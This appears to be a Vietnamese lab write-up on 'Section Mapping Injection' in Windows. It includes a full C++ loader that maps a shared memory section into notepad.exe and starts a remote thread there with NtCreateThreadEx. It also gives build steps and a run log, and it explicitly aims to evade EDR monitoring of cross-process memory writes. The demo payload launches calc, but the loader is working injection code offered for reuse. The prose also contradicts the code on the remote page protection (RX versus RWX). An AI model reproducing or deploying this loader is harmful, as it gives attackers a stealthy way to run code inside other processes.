
---

# 📝 [PE 19] NtCreateSection and NtMapViewOfSection (Section Mapping Injection)

## 📌 1. Tổng Quan Kỹ Thuật (Technical Overview)

**Section Mapping Injection** thông qua chuỗi cổng Native API Subsystem là một giải thuật can thiệp bộ nhớ ảo và điều hướng luồng xử lý ở cấp độ nhân nâng cao, thuộc phân hệ **Né tránh cấu trúc kiểm soát hành vi giao tiếp liên tiến trình (Inter-Process Cross-Memory Telemetry Evasion)**.

Trong các mô hình tiêm nhiễm mã thực thi truyền thống, Loader bắt buộc phải triệu hồi cặp bài trùng Win32 API nhạy cảm là `VirtualAllocEx` và `WriteProcessMemory`. Đây là những điểm thắt nút trinh sát (Choke Points) sơ khởi của các giải pháp Endpoint Detection and Response (EDR) hiện đại, nơi các bộ lọc Kernel Callbacks (`ObRegisterCallbacks`) và bẫy Hook User-mode thiết lập mật độ giám sát dày đặc kịch trần.

Dự án PE 19 hóa giải toàn diện rào cản này bằng cơ chế **Ánh xạ phân đoạn vùng nhớ gương (Shared Section Memory Mirroring Taxonomy)**. Thay vì can thiệp thô bạo xuyên biên giới RAM, Loader chủ động khởi tạo một phân vùng nhớ dùng chung vô danh (Anonymous Shared Memory Section) lọt lòng cấu trúc Object của Kernel, sau đó thực hiện cấu hình ánh xạ hai góc nhìn khác nhau (Views) trỏ chung vào một ô nhớ vật lý hạ tầng. Khi Loader ghi dữ liệu mã máy vào View nội tại của mình, dữ liệu tự động phản chiếu sang trang nhớ của tiến trình mục tiêu (văn cảnh thực nghiệm: `notepad.exe`) một cách song song vô vết, triệt tiêu hoàn toàn sự hiện diện của các hàm ghi nhớ chéo tiến trình lộ liễu.

### 🎯 Mục tiêu nghiên cứu:

* **Vô hiệu hóa cảm biến Cross-Process Memory Write**: Khai hỏa chiến dịch bơm mã thực thi sang RAM đối phương mà không phát ra bất kỳ lệnh ghi bộ nhớ chéo tiến trình nào.
* **Làm chủ cấu trúc Kernel Section Objects**: Nghiên cứu và vận hành cấu trúc quản lý đối tượng phân đoạn nhớ dùng chung (`Section Object`) và cơ chế quản lý góc nhìn không gian ảo (`View of Section`) của hệ điều hành Windows.

---

## 🔬 2. Giải Phẫu Cơ Chế Hệ Thống (Windows Internals Analysis)

Trong kiến trúc quản lý bộ nhớ của Windows Subsystem, phân hệ Windows Memory Manager sử dụng khái niệm **Section Objects** (được mô tả ở mức độ Win32 Subsystem dưới dạng các đối tượng *File Mapping Object*) để quản lý các khối dữ liệu bộ nhớ ảo có khả năng chia sẻ hoặc ánh xạ song song giữa nhiều không gian địa chỉ cô lập khác nhau.

Quy trình giải phẫu bản đồ RAM và thiết lập ma trận bộ nhớ gương chéo tiến trình được điều phối ngầm qua 5 giai đoạn tại tầng cấu trúc NTDLL:

```
[NtCreateSection: Khởi tạo đối tượng phân đoạn vô danh trong RAM Kernel]
       ├──> [NtMapViewOfSection (Loader View): Ánh xạ góc nhìn cục bộ mang quyền RW]
       ├──> [NtMapViewOfSection (Target View): Ánh xạ góc nhìn đối phương mang quyền RX]
       └──> [RtlCopyMemory (Local): Ghi mã máy cục bộ -> Kernel tự động đồng bộ gương sang Notepad]

```

1. **Khởi tạo lõi Section Object (`NtCreateSection`)**: Loader phát lệnh gửi yêu cầu xuống Object Manager của Kernel nhằm mở một đối tượng Section Object rỗng vô danh lọt lòng RAM hệ thống với kích thước phân bổ toán học khít khao bằng một trang nhớ ($4\text{ KB}$), đính kèm hằng số bảo vệ đặc quyền cho phép thực thi kịch khung `PAGE_EXECUTE_READWRITE`.
2. **Thiết lập góc nhìn Loader (`Loader View Allocation`)**: Loader triệu hồi hàm Native API `NtMapViewOfSection` để cấu hình ánh xạ góc nhìn đầu tiên của đối tượng Section này vào ngay trong không gian địa chỉ ảo nội tại của chính nó. View cục bộ này chỉ cần thiết lập cờ thuộc tính **`PAGE_READWRITE` (RW)** nhằm mục đích nạp mã máy phẳng và dữ liệu cấu trúc một cách an toàn, hợp pháp.
3. **Thiết lập góc nhìn gương từ xa (`Target View Mapping`)**: Loader tiếp tục phát lệnh triệu hồi `NtMapViewOfSection` lần thứ hai, nhưng lần này truyền vào Handle kết nối của tiến trình mục tiêu (`notepad.exe`). Windows Memory Manager tiếp nhận và thực hiện ánh xạ chính đối tượng Section Object Kernel đó vào một tọa độ bộ nhớ ảo trong RAM của Notepad, nhưng áp đặt cờ bảo vệ thuộc tính nghiêm ngặt là **`PAGE_EXECUTE_READ` (RX)**. Hệ quả là, hai vùng không gian ảo nằm ở hai không gian địa chỉ hoàn toàn cô lập thực chất đang liên kết gương, trỏ chung vào cùng một tọa độ ô nhớ vật lý (Physical Pages) hạ tầng bên dưới.
4. **Kích nổ cơ chế phản chiếu vô vết**: Loader thực hiện lệnh sao chép bộ nhớ cục bộ tuyến tính (`RtlCopyMemory`) để đổ mảng byte mã máy độc lập vị trí (PIC) cùng cấu trúc tham số tuyệt đối vào phân vùng View `RW` nội tại của mình. Nhờ ma trận liên kết gương ở tầng nhân, toàn bộ mã máy tự động xuất hiện lọt lòng RAM của tiến trình Notepad chéo biên giới một cách vô hình. Các cảm biến giám sát User-mode Hooks của EDR hoàn toàn bị mù lòa hành vi do Loader không phát ra bất kỳ lệnh ghi bộ nhớ chéo tiến trình nào.
5. **Triệu hồi luồng Native (`NtCreateThreadEx`)**: Khởi tạo luồng thực thi phụ từ xa đâm thẳng vào tọa độ Target View mang quyền `RX` của Notepad để CPU đối phương bắt đầu chu kỳ rút lệnh xử lý Payload.

---

## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)

Source.cpp:
```cpp
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <vector>

// 1. Khai báo nguyên mẫu các Native API dạng con trỏ hàm phẳng, dùng PVOID để né lỗi định nghĩa thư viện ngoài
typedef NTSTATUS(NTAPI* pNtCreateSection)(
    OUT PHANDLE SectionHandle,
    IN ACCESS_MASK DesiredAccess,
    IN PVOID ObjectAttributes OPTIONAL,
    IN PLARGE_INTEGER MaximumSize OPTIONAL,
    IN ULONG SectionPageProtection,
    IN ULONG AllocationAttributes,
    IN HANDLE FileHandle OPTIONAL
    );

typedef NTSTATUS(NTAPI* pNtMapViewOfSection)(
    IN HANDLE SectionHandle,
    IN HANDLE ProcessHandle,
    IN OUT PVOID* BaseAddress,
    IN ULONG_PTR ZeroBits,
    IN SIZE_T CommitSize,
    IN OUT PLARGE_INTEGER SectionOffset OPTIONAL,
    IN OUT PSIZE_T ViewSize,
    IN DWORD InheritDisposition,
    IN ULONG AllocationType,
    IN ULONG Win32Protect
    );

typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
    OUT PHANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN PVOID ObjectAttributes OPTIONAL,
    IN HANDLE ProcessHandle,
    IN PVOID StartRoutine,
    IN PVOID Argument OPTIONAL,
    IN ULONG CreateFlags,
    IN ULONG_PTR ZeroBits,
    IN SIZE_T StackSize,
    IN SIZE_T MaximumStackSize,
    IN PVOID AttributeList OPTIONAL
    );

typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);

typedef struct _THREAD_DATA {
    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM tiến trình đích
    char szCommand[32];       // Chuỗi lệnh thực thi chức năng mở máy tính
} THREAD_DATA, * PTHREAD_DATA;

// Hàm chức năng độc lập vị trí gánh luồng chạy khi tiêm phản chiếu sang Notepad
DWORD WINAPI RemoteMirrorPayload(LPVOID lpParam) {
    PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
    if (pData && pData->pWinExec) {
        // Gọi bằng con trỏ hàm tuyệt đối, né sạch lỗi địa chỉ tương đối RIP
        pData->pWinExec(pData->szCommand, SW_HIDE);
    }
    return 0;
}

// Bộ quét RAM động tự động nhận diện PID, KHÔNG PHÂN BIỆT chữ hoa chữ thường
DWORD GetProcessIDByName(const std::wstring& processName) {
    DWORD processID = 0;
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) {
                processID = pe32.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);
    return processID;
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 19: NtCreateSection MapViewOfSection " << std::endl;
    std::cout << "====================================================" << std::endl;

    std::wstring targetProcess = L"notepad.exe";
    DWORD pid = GetProcessIDByName(targetProcess);

    if (pid == 0) {
        std::cerr << "[-] Notepad.exe khong chay! Vui long bat Notepad truoc nhen." << std::endl;
        std::cin.get();
        return EXIT_FAILURE;
    }

    std::cout << "[+] Da tim thay Notepad.exe voi PID: " << pid << std::endl;

    // 2. Resolve các hàm Native từ ntdll.dll
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return EXIT_FAILURE;

    pNtCreateSection NtCreateSection = (pNtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
    pNtMapViewOfSection NtMapViewOfSection = (pNtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
    pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");

    // 3. Mở Handle quyền cao kết nối sang Notepad
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        std::cerr << "[-] OpenProcess that bai!" << std::endl;
        return EXIT_FAILURE;
    }

    // Kích thước ước tính kịch khung cho phân vùng mã máy và cấu trúc dữ liệu
    SIZE_T totalPayloadSize = 4096;

    // ─── BƯỚC 4: KHỞI TẠO SECTION THÔ TRONG LÒNG KERNEL DƯỚI QUYỀN RWX ───
    HANDLE hSection = NULL;
    LARGE_INTEGER sectionMaxSize = { 0 };
    sectionMaxSize.QuadPart = totalPayloadSize;

    // Tạo Section tổng thể mang quyền bảo vệ thực thi, đọc, ghi cao nhất
    NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &sectionMaxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
    if (!hSection) {
        std::cerr << "[-] NtCreateSection that bai!" << std::endl;
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    // ─── BƯỚC 5: ÁNH XẠ VIEW THỨ NHẤT VÀO LÒNG LOADER CỦA TA (QUYỀN RW) ───
    PVOID localViewAddress = NULL;
    SIZE_T localViewSize = totalPayloadSize;
    NtMapViewOfSection(hSection, GetCurrentProcess(), &localViewAddress, 0, 0, NULL, &localViewSize, 1, 0, PAGE_READWRITE);
    std::cout << "[+] Da thiet lap View guong noi bo tai Loader: 0x" << std::hex << localViewAddress << std::endl;

    // Tiến hành ghi nội dung logic hàm và dữ liệu cục bộ lên View 1
    // Đoạn mã máy Payload được đặt ở đầu vùng nhớ gương
    PVOID localCodeAddr = localViewAddress;
    memcpy(localCodeAddr, (PVOID)RemoteMirrorPayload, 500);

    // Cấu trúc dữ liệu tham số tuyệt đối đặt lùi lại phía sau ô nhớ offset 500 byte
    PTHREAD_DATA pLocalDataAddr = (PTHREAD_DATA)((DWORD_PTR)localViewAddress + 500);

    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32) {
        pLocalDataAddr->pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
    }
    strcpy_s(pLocalDataAddr->szCommand, "cmd.exe /c start calc");
    std::cout << "[+] Ghi du lieu tham so vao guong noi bo hoan tat." << std::endl;

    // ─── BƯỚC 6: ÁNH XẠ VIEW THỨ HAI SANG KHÔNG GIAN RAM TIẾN TRÌNH NOTEPAD ───
    // Dữ liệu từ View 1 tự động phản chiếu nhảy sang View 2 mà không cần WriteProcessMemory!
    PVOID remoteViewAddress = NULL;
    SIZE_T remoteViewSize = totalPayloadSize;
    NtMapViewOfSection(hSection, hProcess, &remoteViewAddress, 0, 0, NULL, &remoteViewSize, 1, 0, PAGE_EXECUTE_READWRITE);
    std::cout << "[+] PHAN CHIEU THANH CONG: Toa do View tu xa inside Notepad: 0x" << std::hex << remoteViewAddress << std::endl;

    // Tính toán tọa độ thực thi chức năng và dữ liệu tham số tương ứng bên phía RAM tiến trình Notepad
    PVOID remoteCodeBuffer = remoteViewAddress;
    PVOID pRemoteDataBuffer = (PVOID)((DWORD_PTR)remoteViewAddress + 500);

    // ─── BƯỚC 7: KÍCH NỔ LUỒNG CPU NATIVE TỪ XA QUA Ô NHỚ PHẢN CHIẾU ───
    std::cout << "[*] Dang dung NtCreateThreadEx de sinh luong va khai hoa..." << std::endl;
    HANDLE hThread = NULL;
    NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, remoteCodeBuffer, pRemoteDataBuffer, 0, 0, 0, 0, NULL);

    if (hThread != NULL) {
        // Ép luồng gánh trạng thái an toàn
        WaitForSingleObject(hThread, INFINITE);
        std::cout << "[+] Section Mapping executed successfully inside Target!" << std::endl;
        CloseHandle(hThread);
    }
    else {
        std::cerr << "[-] NtCreateThreadEx that bai! Error code: " << GetLastError() << std::endl;
    }

    // ─── BƯỚC 8: GIẢI PHÓNG DIỆN MẠO GƯƠNG VÀ ĐÓNG HANDLE CHỐNG RÒ RỈ ───
    UnmapViewOfFile(localViewAddress);
    CloseHandle(hSection);
    CloseHandle(hProcess);

    std::cout << "\n[*] Hoan thanh quy trinh. Nhan Enter de dong cua so..." << std::endl;
    std::cin.get();
    return EXIT_SUCCESS;
}

```

---

## 🎛️ 4. Cấu Hình Biên Dịch Dự Án (Build & Deployment)

Để bảo đảm file thực thi `.exe` Loader vận hành mượt mà, độc lập tuyến tính khi chuyển giao sang các phân hệ máy ảo Sandbox cô lập:

### ⚙️ Thiết lập trên môi trường Microsoft Visual Studio:

1. Thiết lập cấu hình thanh công cụ quản lý dự án chính xác ở chế độ chuyên dụng **`Release`** và kiến trúc nền tảng **`x64`**.
2. Di chuyển đến mục: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại thông số cấu hình thuộc tính `Runtime Library`, lật cờ sang tùy chọn **`Multi-threaded (/MT)`** nhằm mục đích tĩnh hóa liên kết (Static Linkage) toàn bộ thư viện liên kết động của CRT bọc lọt lòng file chạy.
3. Tiến hành thực hiện click chuột phải vào tên dự án $\rightarrow$ Chọn **`Rebuild`** để xuất bản tệp tin nhị phân chuẩn chỉ phẳng sạch.

---

## 📊 5. Thực Nghiệm Kích Hoạt Thực Tế (Demonstration)

Khởi chạy ứng dụng nền `Notepad.exe` trên môi trường bộ nhớ máy Lab, sau đó thực thi file thực hành thông qua cửa sổ dòng lệnh PowerShell ngoài đĩa thô nhằm theo dõi ma trận phản chiếu RAM gương:

```powershell
PS C:\Users\Admin\source\repos\Task6\PE19_NtCreateSection_MapViewOfSection\x64\Release> C:\Users\Admin\source\repos\Task6\PE19_NtCreateSection_MapViewOfSection\x64\Release\NtCreateSection_MapViewOfSection.exe
====================================================
[*] PE 19: NtCreateSection MapViewOfSection
====================================================
[+] Da tim thay Notepad.exe voi PID: 3472
[+] Da thiet lap View guong noi bo tai Loader: 0x00000246B73C0000
[+] Ghi du lieu tham so vao guong noi bo hoan tat.
[+] PHAN CHIEU THANH CONG: Toa do View tu xa inside Notepad: 0x000001D112E60000
[*] Dang dung NtCreateThreadEx de sinh luong va khai hoa...
[+] Section Mapping executed successfully inside Target!

[*] Hoan thanh quy trinh. Nhan Enter de dong cua so...

```

### Demo:
<img width="1920" height="1140" alt="devenv_EqVex1s1DL" src="https://github.com/user-attachments/assets/88fa1553-8915-4e04-bf3c-21e4932eb53f" />


---

## 📚 6. Tài Liệu Tham Khảo (Technical References)

* **Microsoft Learn Subsystem Guide**: *NtCreateSection routine (winternals.h)* & *NtMapViewOfSection function technical parameters* - Windows Native API Documentation.
* **Windows Kernel Architecture Reference**: *Understanding Section Objects, Views, and Shared Memory Managers* - Microsoft Press.
* **Phidias (Security Frameworks)**: *Evading Memory Allocation Telemetry via Shared Section Mirroring and Page Remapping Techniques*.
* **MITRE ATT&CK Framework**: *Process Injection: Shared Memory (T1055.002)* - In-depth analysis on behavioral signature bypasses.

---
